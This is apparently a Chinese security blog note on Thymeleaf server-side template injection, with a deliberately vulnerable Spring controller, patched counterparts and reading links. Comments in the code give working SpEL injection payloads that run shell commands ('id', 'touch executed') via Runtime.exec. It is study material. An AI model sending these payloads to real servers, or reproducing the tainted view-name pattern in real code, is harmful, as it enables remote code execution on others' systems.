---
title: Thymeleaf模板注入
date: 2025-10-28 13:59:47
updated: 2025-11-11 15:14:35
tags:
  - Web
  - java
  - 代码审计
---
Thymeleaf 3.0.0 至 3.0.11 版本存在模板注入漏洞。该漏洞在Thymeleaf 3.0.12及以后版本已经得到修复，但还是存在一些 Bypass 的方式。

# 漏洞示例

```java
package com.veracode.research;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.*;

import javax.servlet.http.HttpServletResponse;

@Controller
public class HelloController {

    Logger log = LoggerFactory.getLogger(HelloController.class);

    @GetMapping("/")
    public String index(Model model) {
        model.addAttribute("message", "happy birthday");
        return "welcome";
    }

    //GET /path?lang=en HTTP/1.1
    //GET /path?lang=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22id%22).getInputStream()).next()%7d__::.x
    @GetMapping("/path")
    public String path(@RequestParam String lang) {

        return "user/" + lang + "/welcome"; //template path is tainted
    }

    //GET /fragment?section=main
    //GET /fragment?section=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22touch%20executed%22).getInputStream()).next()%7d__::.x
    @GetMapping("/fragment")
    public String fragment(@RequestParam String section) {
        return "welcome :: " + section; //fragment is tainted
    }

    @GetMapping("/doc/{document}")
    public void getDocument(@PathVariable String document) {
        log.info("Retrieving " + document);
        //returns void, so view name is taken from URI
    }

//修复
    
    @GetMapping("/safe/fragment")
    @ResponseBody
    public String safeFragment(@RequestParam String section) {
        return "welcome :: " + section; //FP, as @ResponseBody annotation tells Spring to process the return values as body, instead of view name
    }

    @GetMapping("/safe/redirect")
    public String redirect(@RequestParam String url) {
        return "redirect:" + url; //FP as redirects are not resolved as expressions
    }

    @GetMapping("/safe/doc/{document}")
    public void getDocument(@PathVariable String document, HttpServletResponse response) {
        log.info("Retrieving " + document); //FP
    }
}
```

# 学习文章

https://www.cnpanda.net/sec/1063.html

https://moonsec.top/articles/121

https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/

https://www.cnblogs.com/colo/p/15507738.html

https://xz.aliyun.com/t/9826

https://xz.aliyun.com/t/10514